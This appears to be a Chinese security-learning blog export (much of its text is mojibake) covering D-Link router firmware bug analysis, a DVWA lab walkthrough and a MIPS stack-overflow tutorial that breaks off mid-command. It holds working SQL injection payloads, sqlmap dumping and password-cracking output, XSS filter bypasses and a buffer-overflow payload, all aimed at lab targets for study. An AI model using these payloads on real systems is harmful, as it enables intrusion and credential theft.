    <url>%2F2019%2F07%2F20%2FIOT-D-link%2F</url>
    <content type="text"><![CDATA[DIR-815æ ˆæº¢å‡ºæ¼æ´ž å±¡æ¬¡è°ƒè¯•éƒ½å¤±è´¥äº†ï¼Œæˆ‘æ‰å‘çŽ°åŽŸæ¥è¿™ä¸ªç‰ˆæœ¬çš„DIR-815å·²ç»ä¿®å¤äº†(DIR-815_REVB_FIRMWARE_2.03.B08)ã€‚ æ‰€ä»¥è¿™ä¸ªæ ˆæº¢å‡ºæ˜¯ä¸å­˜åœ¨çš„ 123456789.text:0040BE04 move $a3, $s2.text:0040BE08 la $a2, aSSPostxml # &quot;%s/%s/postxml&quot;.text:0040BE0C move $a0, $s1 # s.text:0040BE10 li $a1, 0x400 # maxlen.text:0040BE14 jalr $t9 ; snprintf.text:0040BE18 sw $v0, 0x4F0+var_4E0($sp).text:0040BE1C lw $gp, 0x4F0+var_4D8($sp).text:0040BE20 move $a2, $s1.text:0040BE24 la $t9, xmldbc_del DIR-645 ç¼“å†²åŒºæº¢å‡ºæ¼æ´ž åŠ¨æ€è°ƒè¯•ï¼š åœ¨authenticationcgi_mainå¤„ä¸‹æ–­ç‚¹ æ­¤æ—¶è¿”å›žåœ°å€ä¿å­˜åœ¨è¿™é‡Œï¼š ä¹‹åŽè¿è¡Œåˆ°æ­¤å¤„ï¼š æ­¤æ—¶è¿”å›žåœ°å€è¢«è¦†ç›–äº† ç»§ç»­è¿è¡Œï¼Œç¨‹åºæžœç„¶å´©æºƒäº† è¿›å…¥åˆ°å‡½æ•°sub40A424 ç¨‹åºåœ¨æ­¤æ—¶å´©æºƒäº† å°è¯•ä¿®æ”¹passwordé•¿åº¦ ç¨‹åºè¿˜æ˜¯å´©æºƒäº† æŸ¥çœ‹åæ±‡ç¼–ä»£ç  ç¨‹åºä»Žå¤–éƒ¨è¯»å…¥CONTENT_LENGTHæ²¡æœ‰è¿›è¡Œä»»ä½•æ£€æŸ¥ 12345678910111213141516171819202122232425text:0040B4A0 la $t9, getenv.text:0040B4A4 la $a0, aContent_length # &quot;CONTENT_LENGTH&quot;.text:0040B4A8 jalr $t9 ; getenv.text:0040B4AC move $s0, $v0.text:0040B4B0 lw $gp, 0xF90+var_F78($sp).text:0040B4B4 beqz $s0, loc_40B610.text:0040B4B8 addiu $a0, $sp, 0xF90+var_938.text:0040B4BC beqz $v0, loc_40B614.text:0040B4C0 addiu $a1, $sp, 0xF90+var_E1C.text:0040B4C4 la $t9, atoi.text:0040B4C8 nop.text:0040B4CC jalr $t9 ; atoi.text:0040B4D0 move $a0, $v0 # nptr.text:0040B4D4 lw $gp, 0xF90+var_F78($sp).text:0040B4D8 move $s0, $v0.text:0040B4DC la $v1, stdin.text:0040B4E0 la $t9, fileno.text:0040B4E4 lw $a0, (stdin - 0x4353CC)($v1) # stream.text:0040B4E8 jalr $t9 ; fileno.text:0040B4EC addiu $s1, $sp, 0xF90+var_430.text:0040B4F0 lw $gp, 0xF90+var_F78($sp).text:0040B4F4 move $a0, $v0 # fd.text:0040B4F8 la $t9, read.text:0040B4FC move $a1, $s1 # buf.text:0040B500 jalr $t9 ; read è®¡ç®—åç§»é‡ï¼› åŽé¢çš„åˆ©ç”¨è¿‡ç¨‹æ„Ÿè§‰æ¯”è¾ƒå¤æ‚ï¼Œæ²¡èƒ½æˆåŠŸåœ°å¤çŽ° DIR-645å‘½ä»¤æ‰§è¡Œæ¼æ´ž åœ¨å®‰å…¨å®¢ä¸Šçœ‹åˆ°äº†ä¸€ç¯‡åˆ†æžDIR-645å‘½ä»¤æ‰§è¡Œåœ°æ–‡ç« ï¼Œéšåˆ†æžä¸€ä¸‹åŽŸç† ç›´æŽ¥æŸ¥çœ‹servicecgi_mainå‡½æ•° é¦–å…ˆä¼šå¯¹è¯·æ±‚æ–¹æ³•è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æžœæ˜¯POSTæ–¹æ³•åˆ™ä¼šè°ƒç”¨cgibin_parse_requestè§£æžå‚æ•°ï¼Œå…·ä½“çš„å®žçŽ°æš‚æ—¶ä¸è€ƒè™‘ï¼Œä¸»è¦æ˜¯è§£æžCONTENT_TYPEå’ŒCONTENT_LENGTH,ä¹‹åŽä¼šè°ƒç”¨sess_ispoweruseråˆ¤æ–­æ˜¯å¦ä¸ºåˆæ³•ç”¨æˆ· ä¹‹åŽèŽ·å– POST è¡¨å•å­—æ®µï¼Œè‹¥å­—æ®µåä¸º EVENT çš„è¯ï¼Œå°±å°† &quot;event %s &gt; /dev/null&quot; ä½œä¸ºå‚æ•°æ‰§è¡Œ lxmldbc_system å‡½æ•°ã€‚ æŸ¥çœ‹lxmldbc_systemå‡½æ•° 123456789sw $a1, 0x428+arg_4($sp)sw $a2, 0x428+arg_8($sp)sw $a3, 0x428+arg_C($sp)move $a2, $a0 # formatmove $a3, $v0 # argmove $a0, $s0 # ssw $v0, 0x428+var_410($sp)jalr $t9 ; vsnprintf li $a1, 0x400 # maxlen ä¸»è¦å…³æ³¨æœ€åŽä¸¤æ¡æŒ‡ä»¤ï¼Œå› ä¸ºè¿™é‡Œç”¨åˆ°äº†MIPSä¸­åœ°åˆ†æ”¯å»¶è¿Ÿæ§½æŠ€æœ¯ï¼Œæ‰€ä»¥$a1ä¼ é€’å‚æ•°çš„æŒ‡ä»¤å­˜æ”¾åœ¨jalræŒ‡ä»¤ä¹‹åŽ æ•…vsnprintf($sp+0x428+var_40C,0x400,&quot;event %s &gt; /dev/null&quot;,arg_4) vsnprintfå‡½æ•°çš„ç”¨æ³•ï¼š å‡½æ•°åŽŸåž‹ï¼šint vsnprintf(char str, size_t size, const char format,va_list ap); å‡½æ•°è¯´æ˜Žï¼šå°†å¯å˜å‚æ•°æ ¼å¼åŒ–è¾“å‡ºåˆ°ä¸€ä¸ªå­—ç¬¦æ•°ç»„ å‚æ•°ï¼šstrè¾“å‡ºåˆ°çš„æ•°ç»„ï¼ŒsizeæŒ‡å®šå¤§å°ï¼Œé˜²æ­¢è¶Šç•Œï¼Œformatæ ¼å¼åŒ–å‚æ•°ï¼Œapå¯å˜å‚æ•°åˆ—è¡¨å‡½æ•°ç”¨æ³• æŽ¥ç€è°ƒç”¨systemå‡½æ•° 12jalr $t9 ; systemmove $a0, $s0 # command çœ‹ä¸€ä¸‹å‚æ•°çš„ä¼ é€’è¿‡ç¨‹ $s0æœ¬æ¥æ˜¯æ ˆä¸Šçš„ä¸€ä¸ªå˜é‡ï¼Œvsnprintfå°†å¯å˜å‚æ•°æ ¼å¼åŒ–è¾“å‡ºåˆ°å…¶ä¸­ï¼Œä¹‹åŽåˆå°†å…¶ä½œä¸ºå‚æ•°ä¼ é€’ç»™systemå‡½æ•° ç›¸å½“äºŽæ‰§è¡Œäº† system(&quot;event %s &gt; /dev/null&quot;) è¿™æ ·å°±å¯ä»¥æƒ³åŠžæ³•è¿›è¡Œå‘½ä»¤æ³¨å…¥äº† å‚è€ƒ è·¯ç”±å™¨æ¼æ´žæŒ–æŽ˜ä¹‹ DIR-815 æ ˆæº¢å‡ºæ¼æ´žåˆ†æž]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWAå­¦ä¹ ]]></title>
    <url>%2F2019%2F07%2F20%2FDVWA%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[DVWA ç”¨çš„vulstudyçš„çŽ¯å¢ƒ é»˜è®¤ç”¨æˆ·åæ˜¯adminå¯†ç æ˜¯password éœ€è¦å¯åŠ¨çš„æ—¶å€™docker-compose up -då°±è¡Œäº† åœæ­¢çš„è¯docker-compose stopåœæ­¢å®¹å™¨ sqlæ³¨å…¥ æœ€ç®€å•çš„ æ²¡åŠžæ³•æ˜¯æˆ‘å¤ªèœäº†ï¼Œæƒå½“å¤ä¹ å¥½äº† ðŸ˜¢ è¾“å…¥1å¾—åˆ°ï¼š 123ID: 1First name: adminSurname: admin ç„¶åŽå¼€å§‹çˆ†å­—æ®µ 1' order by 2 # ç¡®è®¤å›žæ˜¾ä½ç½®ï¼š 1' union select 1,2 # 123ID: 1&apos; union select 1,2 #First name: 1Surname: 2 å¼€å§‹çˆ†æ•°æ®åº“ 1' union select database(),2 # å¾—åˆ°æ•°æ®åº“å 123ID: 1&apos; union select database(),2 #First name: dvwaSurname: 2 å¼€å§‹çˆ†è¡¨ è¡¨éƒ½å­˜åœ¨information_schema.tablesè¿™é‡Œé¢ 1' union select table_name,2 from information_schema.tables where table_schema= 'dvwa'# å¾—åˆ°ï¼š 123456ID: 1&apos; union select table_name,2 from information_schema.tables where table_schema= &apos;dvwa&apos;#First name: guestbookSurname: 2ID: 1&apos; union select table_name,2 from information_schema.tables where table_schema= &apos;dvwa&apos;#First name: usersSurname: 2 å¼€å§‹çˆ†å­—æ®µ ç„¶è€Œæˆ‘å¹¶ä¸çŸ¥é“æ€Žä¹ˆçˆ†å­—æ®µðŸ˜ž äºŽæ˜¯çŒœæµ‹æ˜¯password 1' union select password,2 from users å¾—åˆ°äº†ï¼š 123456789101112ID: 1&apos; union select password, 2 from users #First name: 5f4dcc3b5aa765d61d8327deb882cf99Surname: 2ID: 1&apos; union select password, 2 from users #First name: e99a18c428cb38d5f260853678922e03Surname: 2ID: 1&apos; union select password, 2 from users #First name: 8d3533d75ae2c3966d7e0d4fcc69216bSurname: 2ID: 1&apos; union select password, 2 from users #First name: 0d107d09f5bbe40cade3de5c71e9e9b7Surname: 2 å°ç™½ä¹‹æ—…åˆ°æ­¤ç»“æŸ å‡çº§åˆ°medium æ”¹æˆäº†postæ–¹å¼æäº¤æ•°æ® è¿™æ—¶å€™sqlmapæ´¾ä¸Šç”¨åœºäº† å…ˆå°†æŠ“åˆ°çš„æ•°æ®åŒ…ä¿å­˜ä¸ºdvwa.txtæ–‡ä»¶ ç„¶åŽ python sqlmap.py -r &quot;dvwa.txt&quot; --dbs sqlmapå¾ˆèªæ˜Žçš„åˆ¤æ–­å‡ºè¿™æ˜¯MYSQLæ•°æ®åº“å¹¶ä¸”åˆ—å‡ºäº†æ‰€æœ‰çš„æ•°æ®åº“ 123456[22:21:04] [INFO] fetching database namesavailable databases [4]:[*] dvwa[*] information_schema[*] mysql[*] performance_schema ä¸è¿‡è¿™ä¸ªpayloadå¾ˆç¥žå¥‡ 12345678910111213141516Parameter: id (POST) Type: boolean-based blind Title: Boolean-based blind - Parameter replace (original value) Payload: id=(SELECT (CASE WHEN (1900=1900) THEN 1 ELSE (SELECT 6858 UNION SELECT 6800) END))&amp;Submit=Submit Type: error-based Title: MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED) Payload: id=1 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(7517=7517,1))),0x7162787071,0x78))s), 8446744073709551610, 8446744073709551610)))&amp;Submit=Submit Type: time-based blind Title: MySQL &gt;= 5.0.12 AND time-based blind Payload: id=1 AND SLEEP(5)&amp;Submit=Submit Type: UNION query Title: Generic UNION query (NULL) - 2 columns Payload: id=1 UNION ALL SELECT CONCAT(0x716b7a6b71,0x464a61616642417872426e5a6c657171445176626c57687143476d6e4d5661714a5768516f4d566a,0x7162787071),NULL-- WDTr&amp;Submit=Submit æŒ‡å®šæ•°æ®åº“çˆ†è¡¨ python sqlmap.py -r &quot;dvwa.txt&quot; -D dvwa --tables å¾—åˆ°ï¼š 123456Database: dvwa[2 tables]+-----------+| guestbook || users |+-----------+ æŒ‡å®šè¡¨çˆ†å­—æ®µ python sqlmap.py -r &quot;dvwa.txt&quot; -D dvwa -T users --columns 123456789101112131415Database: dvwaTable: users[8 columns]+--------------+-------------+| Column | Type |+--------------+-------------+| user | varchar(15) || avatar | varchar(70) || failed_login | int(3) || first_name | varchar(15) || last_login | timestamp || last_name | varchar(15) || password | varchar(32) || user_id | int(6) |+--------------+-------------+ æŒ‡å®šè¡¨ç„¶åŽdumpæ•°æ® python sqlmap.py -r &quot;dvwa.txt&quot; -D dvwa -T users --dump-all sqlmapå¾ˆæœºæ™ºçš„åœ¨ç ´è§£md5 123[22:22:02] [INFO] cracked password &apos;charley&apos; for hash &apos;8d3533d75ae2c3966d7e0d4fcc69216b&apos;[22:22:04] [INFO] cracked password &apos;letmein&apos; for hash &apos;0d107d09f5bbe40cade3de5c71e9e9b7&apos;[22:22:04] [INFO] cracked password &apos;abc123&apos; for hash &apos;e99a18c428cb38d5f260853678922e03&apos; å¾—åˆ°çš„è¡¨ 12345678910| user_id | avatar | user | password | last_name | first_name | last_login | failed_login |+---------+--------------------------------------------------+---------+---------------------------------------------+-----------+------------+---------------------+--------------+| 1 | http://192.168.41.161/hackable/users/admin.jpg | admin | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin | admin | 2019-07-15 13:57:22 | 0 || 2 | http://192.168.41.161/hackable/users/gordonb.jpg | gordonb | e99a18c428cb38d5f260853678922e03 (abc123) | Brown | Gordon | 2019-07-15 13:57:22 | 0 || 3 | http://192.168.41.161/hackable/users/1337.jpg | 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b (charley) | Me | Hack | 2019-07-15 13:57:22 | 0 || 4 | http://192.168.41.161/hackable/users/pablo.jpg | pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein) | Picasso | Pablo | 2019-07-15 13:57:22 | 0 || 5 | http://192.168.41.161/hackable/users/smithy.jpg | smithy | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith | Bob | 2019-07-15 13:57:22 | 0 |+---------+--------------------------------------------------+---------+---------------------------------------------+-----------+------------+---------------------+--------------+ sqlmap tql tql tql high è¿™æ—¶å€™å°±å¾ˆã€‚ã€‚ ä¼šå¼¹å‡ºä¸€ä¸ªé¡µé¢ï¼Œè¾“å…¥æ•°æ®ä¹‹åŽå†è·³å›žæ¥ è¿™å°±å¾ˆå®‰å…¨äº†ðŸ˜› ä½†æ˜¯ã€‚ã€‚ æŸ¥çœ‹æºç ä¹‹åŽå‘çŽ°ï¼š å…¶å®žæ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼› 123// Check database$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";$result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '&lt;pre&gt;Something went wrong.&lt;/pre&gt;' ); æ‰€ä»¥payloadç…§æ ·ç”¨ï¼Œæ²¡é—®é¢˜ impossible è¿™æ¬¡å°±æ›´ä¸ä¸€èˆ¬äº† 123456789101112131415161718192021222324252627282930313233&lt;?phpif( isset( $_GET[ &apos;Submit&apos; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // Get input $id = $_GET[ &apos;id&apos; ]; // Was a number entered? if(is_numeric( $id )) &#123; // Check the database $data = $db-&gt;prepare( &apos;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&apos; ); $data-&gt;bindParam( &apos;:id&apos;, $id, PDO::PARAM_INT ); $data-&gt;execute(); $row = $data-&gt;fetch(); // Make sure only 1 result is returned if( $data-&gt;rowCount() == 1 ) &#123; // Get values $first = $row[ &apos;first_name&apos; ]; $last = $row[ &apos;last_name&apos; ]; // Feedback for end user $html .= &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; &#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; è¿™é‡Œç”¨åˆ°äº†PDOé¢„ç¼–è¯‘çš„æ–¹å¼ é‚£å¯èƒ½å°±çœŸçš„æ²¡åŠžæ³•äº† çœ‹äº†ä¸‹stackoverflow How can I prevent SQL injection in PHP? Use prepared statements and parameterized queries. These are SQL statements that are sent to and parsed by the database server separately from any parameters. This way it is impossible for an attacker to inject malicious SQL. å¯ä»¥æœ‰ä¸¤ç§æ–¹å¼ï¼š 1234567$stmt = $pdo-&gt;prepare(&apos;SELECT * FROM employees WHERE name = :name&apos;);$stmt-&gt;execute(array(&apos;name&apos; =&gt; $name));foreach ($stmt as $row) &#123; // Do something with $row&#125; æˆ–è€…å¯¹äºŽmysqlæ¥è¯´ï¼Œå¯ä»¥ï¼š 123456789$stmt = $dbConnection-&gt;prepare(&apos;SELECT * FROM employees WHERE name = ?&apos;);$stmt-&gt;bind_param(&apos;s&apos;, $name); // &apos;s&apos; specifies the variable type =&gt; &apos;string&apos;$stmt-&gt;execute();$result = $stmt-&gt;get_result();while ($row = $result-&gt;fetch_assoc()) &#123; // Do something with $row&#125; PDOçœŸçš„æ˜¯å®‰å…¨çš„å—ï¼Ÿ Are PDO prepared statements sufficient to prevent SQL injection? SQL injection that gets around mysql_real_escape_string() XSS reflected ç¬¬ä¸€éåœ¨chromeä¸Šè¯•äº†ä¸‹&lt;script&gt;alert(1)&lt;/script&gt;æ²¡æˆåŠŸ ä½†æ˜¯çœ‹æºç ï¼š å¯èƒ½æ˜¯chromeå¤ªå®‰å…¨äº†å§ æ¢æˆfirefoxå°±æ²¡äº‹äº† medium å¦‚æžœçœ‹æºç å°±ä¼šå‘çŽ°åªæ˜¯ç®€å•åœ°å¯¹scriptè¿›è¡Œäº†ä¸€æ¬¡è¿‡æ»¤ $name = str_replace( '&lt;script&gt;', '', $_GET[ 'name' ] ); é‚£ä¹ˆå¦‚ä½•ç»•è¿‡è¿™ä¸ªé™åˆ¶å‘¢ é‚£å°±è¿™æ ·æž„é€  &lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/script&gt; å°±èƒ½ç»•è¿‡è¿‡æ»¤äº†ï¼Œä¸»è¦é—®é¢˜è¿˜æ˜¯è¿‡æ»¤ä¸ä¸¥æ ¼ï¼Œä¹‹è¿‡æ»¤äº†ä¸€æ¬¡ï¼Œæ‰€ä»¥åŒå†™å°±èƒ½å¾ˆå®¹æ˜“åœ°ç»•è¿‡äº† ps. å¤§å°å†™ä¹Ÿå¯ä»¥ high è¿™æ¬¡è¿‡æ»¤æ›´ä¸¥æ ¼äº† $name = preg_replace( '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] ); æœ€åŽåªç•™äº†ä¸€ä¸ª&gt;ç»™ä½  æžœç„¶æˆ‘è®°å¾—è¿˜æœ‰imgæ ‡ç­¾ä¹Ÿå¯ä»¥é€ æˆxssæ¥ç€ &lt;img src=&quot;aa&quot; onError=alert(123) &gt; è¿™æ ·å°±è¡Œå•¦ï¼Œå½“ç„¶chromeå¤ªå®‰å…¨äº†ï¼Œè¿˜æ˜¯ç”¨firefoxå§ impossible 1234567checkToken( $_REQUEST[ &apos;user_token&apos; ],$_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );// Get input$name = htmlspecialchars( $_GET[ &apos;name&apos; ] );// Feedback for end user$html .= &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;; è¿™ç§æƒ…å†µä¸‹è¿˜è¿›è¡Œäº†å®žä½“ç¼–ç ï¼Œçœ‹ä½ æ€Žä¹ˆç»•è¿‡ é‚£äº›å¹´æˆ‘ä»¬æ²¡èƒ½bypassçš„xss filter ä¸€ç¯‡æ€»ç»“äº†xssçš„æ–‡ç«  sql ç›²æ³¨ ä»Žlowå¼€å§‹çœ‹èµ·ï¼Œ ç›´æŽ¥æŠ“åŒ…ç„¶åŽå°†æ•°æ®åŒ…ä¿å­˜èµ·æ¥ï¼Œç”¨sqlmapè·‘ä¸€ä¸‹å°±å°±å‡ºæ¥äº†ï¼Œ-rå‚æ•°æ˜¯è¯»å–ä¸€ä¸ªæ•°æ®åŒ…ä¸­çš„æ–‡ä»¶ï¼Œç„¶åŽsqlmapä¼šè‡ªåŠ¨è§£æžå®ƒ mediume ä¸€æ ·çš„ï¼Œåªæ˜¯æ•°æ®åŒ…å˜æˆäº†postæ–¹å¼æäº¤çš„ high è¿™æ¬¡sqlmapæŠ½é£Žæ²¡è·‘å‡ºæ¥ çœ‹ä¸‹æºç å¥½äº† æœ¬æ¥ç›²æ³¨å°±æ˜¯è¦é€šè¿‡è„šæœ¬æ¥è·‘çš„ï¼Œä½†æ˜¯æˆ‘æ¯”è¾ƒæ‡’emmmï¼Œè¿˜æ˜¯è¦å¤ä¹ ä¸€ä¸‹å¦‚ä½•ç”¨pythonè„šæœ¬è·‘å‡ºæ¥ å¦‚ä½•ç›²æ³¨ï¼Ÿ ä¸€ç¯‡æ–‡ç« å¸¦ä½ æ·±å…¥ç†è§£ SQL ç›²æ³¨ ç›²æ³¨æœ€å¸¸è§çš„ä¸€ä¸ªpayload 127.0.0.1/sqllib/Less-5/?id=1'and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=80â€“+ åˆ¤æ–­æ•°æ®åº“ä¸­ç¬¬ä¸€ä¸ªè¡¨çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ºå¦ä¸º'P' xss å­˜å‚¨åž‹ è¿˜æ˜¯æœ€ç®€å•çš„low è¡¨å•ä¸Šçš„nameæœ‰é•¿åº¦é™åˆ¶ï¼Œä¸è¿‡è¿™åªæ˜¯å‰ç«¯çš„é™åˆ¶è€Œå·² &lt;div id=&quot;guestbook_comments&quot;&gt;Name: &lt;script&gt;alert(1)&lt;/script&gt;&lt;br /&gt;Message: &lt;script&gt;alert(1)&lt;/script&gt;&lt;br /&gt;&lt;/div&gt; æ³¨å…¥æˆåŠŸ medium è¿™å°±å¾ˆå°´å°¬äº†ã€‚ã€‚ åŽŸæ¥è¿™å°±æ˜¯å­˜å‚¨åž‹xssçš„åŽ‰å®³äº†ï¼Œç›´æŽ¥å­˜è¿›åŽ»äº†ï¼Œæ‰€ä»¥æˆ‘æ‰“å¼€mediumçš„é¡µé¢æ—¶ï¼Œè¿žç€å¼¹å‡ºäº†ä¸¤ä¸ªæ¡†æ¡†ï¼ŒäºŽæ˜¯æƒ³çœ‹ä¸€ä¸‹å®ƒçš„æºç ï¼š è¿™é‡Œä¹Ÿæ˜¯é€šè¿‡å¤§å°å†™æˆ–è€…åŒå†™å°±èƒ½ç»•è¿‡çš„ &lt;sCriPt&gt;alert(1)&lt;/script&gt; æ‰¾åˆ°äº†ä¸€ä¸ªxsså¹³å° xsså¹³å° ä½†æ˜¯æˆ‘å‘çŽ°æˆ‘ä¸ä¼šç”¨äº†ã€‚ã€‚]]></content>
      <categories>
        <category>vulstudy</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IOT æ ˆæº¢å‡ºç¬”è®°]]></title>
    <url>%2F2019%2F07%2F20%2FIOT-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[MIPSæ ˆæº¢å‡º x86å’ŒMIPSæŒ‡ä»¤é›† åœ¨æˆ‘çš„ç†è§£çœ‹æ¥ï¼Œx86å¯¹äºŽæ ˆçš„æ“ä½œå¤šäº†pushå’Œpopæ“ä½œï¼Œè€ŒMIPSæŒ‡ä»¤é›†å¹¶æ²¡æœ‰è¿™äº›ï¼ŒåŒæ—¶ä¸¤è€…ä¸€ä¸ªæ˜¯å°ç«¯åºï¼Œä¸€ä¸ªæ˜¯å¤§ç«¯åºï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œåœ¨è°ƒè¯•ç¨‹åºçš„æ—¶å€™ä¾æ—§ç”¨çš„æ˜¯å°ç«¯åºemmmm MISPæŒ‡ä»¤é›†å­˜åœ¨æ ˆæº¢å‡ºçš„åŽŸå›  å¶å­å‡½æ•°å’Œéžå¶å­å‡½æ•° å¶å­å‡½æ•°çš„è¿”å›žåœ°å€æ˜¯ç›´æŽ¥æ”¾åœ¨ ra å¯„å­˜å™¨ä¸­ï¼Œè€Œéžå¶å­å‡½æ•°éœ€è¦è°ƒç”¨å¦å¤–çš„å‡½æ•°ï¼Œè¿™é‡Œçš„å·®å¼‚å°±ç…§æˆäº†éžå¶å­å‡½æ•°éœ€è¦æŠŠå½“å‰çš„è¿”å›žåœ°å€æš‚æ—¶å­˜æ”¾åœ¨æ ˆä¸Š å®žéªŒçŽ¯å¢ƒ attifyOSè™šæ‹Ÿæœºï¼ŒåŸºæœ¬å†…ç½®äº†æˆ‘éœ€è¦çš„æ‰€æœ‰å·¥å…·ï¼Œå½“ç„¶å…¶ä¸­çš„IDAä¼¼ä¹Žè¿‡æœŸäº†ï¼ŒåŽ»å¾çˆ±ç ´è§£ä¸Šæ‰¾äº†ä¸€ä¸ªLinuxç‰ˆæœ¬çš„IDAå®‰è£…äº† å¾çˆ±ç ´è§£é“¾æŽ¥ MIPSåŠ¨æ€è°ƒè¯• ä½¿ç”¨qemu-mipselæˆ–è€…qemu-mipsel-staticè¿›è¡Œè°ƒè¯•ï¼Œqemuæ”¯æŒä½¿ç”¨gdbè¿›è¡Œè°ƒè¯•ï¼Œ-gé€‰é¡¹å¼€å¯ä¸€ä¸ªç«¯å£ï¼ŒIDAå¯ä»¥è¿žæŽ¥ä¸Šè¿™ä¸ªç«¯å£ä»Žè€Œè¿›è¡ŒåŠ¨æ€è°ƒè¯•ã€‚ä¹‹å‰åœ¨çœ‹é›ªçš„è™šæ‹Ÿæœºä¸Šåªèƒ½ç”¨qemu-mipsel-staticè°ƒè¯•ï¼ŒåŽæ¥æ¢æˆäº†attifyOSå‘çŽ°ä¸¤è€…éƒ½è¡Œã€‚ä¸è¿‡å¦‚æžœç¼ºå°‘åŠ¨æ€é“¾æŽ¥åº“çš„è¯è¿˜æ˜¯éœ€è¦chrootåŒæ—¶å°†ç›¸åº”çš„åº“æ‹·è´è¿‡æ¥ã€‚ ç®€å•çš„æ ˆæº¢å‡º æºç ï¼š 123456789101112131415#include &lt;stdio.h&gt;void vuln()&#123; system(&quot;/bin/sh&quot;);&#125;void has_stack(char *src)&#123; char dst[20] = &#123;0&#125;; strcpy(dst,src); printf(&quot;copy success!n&quot;);&#125;void main(int argc,char *argv[])&#123; has_stack(argv[1]);&#125; ä½¿ç”¨mipsel-linux-gccè¿›è¡Œç¼–è¯‘ mipsel-linux-gcc ./stack01.c -o stack01 -static ç¼–è¯‘ä¹‹åŽå¾—åˆ°ï¼š root@ubuntu:~/stack# file stack01 stack01: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), statically linked, not stripped ä½¿ç”¨IDAæŸ¥çœ‹åæ±‡ç¼–ï¼š ç”±äºŽmainå‡½æ•°ä¸­è°ƒç”¨äº†å…¶ä»–çš„å‡½æ•°ï¼Œæ‰€ä»¥mainå‡½æ•°å¿…ç„¶æ˜¯éžå¶å­å‡½æ•°ï¼Œå½“ç„¶è¿™é‡Œæˆ‘ä»¬ä¸æ˜¯è¦†ç›–mainå‡½æ•°çš„è¿”å›žåœ°å€ï¼Œå› ä¸ºhas_stackå‡½æ•°ä¹Ÿæ˜¯éžå¶å­å‡½æ•°ï¼Œè€Œä¸”strcpyæ²¡æœ‰å¯¹é•¿åº¦åšé™åˆ¶ã€‚ strcpyçš„ç¬¬ä¸€ä¸ªå‚æ•°dstå­˜æ”¾åœ¨$a0ä¸­ï¼Œç¬¬äºŒä¸ªå‚æ•°srcå­˜æ”¾åœ¨$a1ä¸­ï¼Œ 123456789.text:00400410 sw $zero, 0x38+var_10($fp).text:00400414 addiu $v0, $fp, 0x38+var_20 #è¦æ‹·è´åˆ°çš„åœ°æ–¹.text:00400418 move $a0, $v0.text:0040041C lw $a1, 0x38+arg_0($fp) # è¦æ‹·è´çš„å†…å®¹.text:00400420 la $v0, strcpy.text:00400424 move $t9, $v0.text:00400428 jalr $t9 ; strcpy.text:0040042C nop.text:00400430 lw $gp, 0x38+var_28($fp) å·æ‡’ä¸€ç‚¹ä¸ä»”ç»†åˆ†æžæ ˆäº† ä½¿ç”¨patternLocOffset.pyå·¥å…·ç”Ÿæˆé•¿åº¦ä¸º30çš„å­—ç¬¦ä¸² 12345/home/oit [oit@ubuntu] [4:31]&gt; python patternOffset.py -c -l 30[*] Create pattern string contains 30 characters ok![+] output to patternShell.txt ok![+] take time: 0.0004 s åŠ¨æ€è°ƒè¯•ï¼š ./qemu-mipsel-static -g 1234 ./stack01 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9 ç›´æŽ¥åœ¨è°ƒç”¨å‡½æ•°è¿”å›žçš„åœ°æ–¹ä¸‹æ–­ç‚¹ï¼ŒæŸ¥çœ‹æ­¤æ—¶çš„$raå¯„å­˜å™¨çš„å€¼ 12345.text:00400450 move $sp, $fp.text:00400454 lw $ra, 0x38+var_4($sp).text:00400458 lw $fp, 0x38+var_8($sp).text:0040045C addiu $sp, 0x38.text:00400460 jr $ra (æ–­ç‚¹) è®¡ç®—éœ€è¦paddingçš„é•¿åº¦ 12345&gt; python patternOffset.py -s 0x62413961 -l 30[*] Create pattern string contains 30 characters ok![*] No exact matches, looking for likely candidates...[+] Possible match at offset 28 (adjusted another-endian)[+] take time: 0.0008 s éœ€è¦å¡«å……28ä¸ªå­—èŠ‚ æœ€åŽçš„payload ./qemu-mipsel-static -g 1234 ./stack01 `python -c &quot;print 'a'*28+'\x90\x03\x40\x00'&quot;` æ­¤æ—¶æˆåŠŸåœ°å‘ç”Ÿäº†è·³è½¬ 12345root@ubuntu:~/stack# ./qemu-mipsel-static ./stack01 `python -c &quot;print 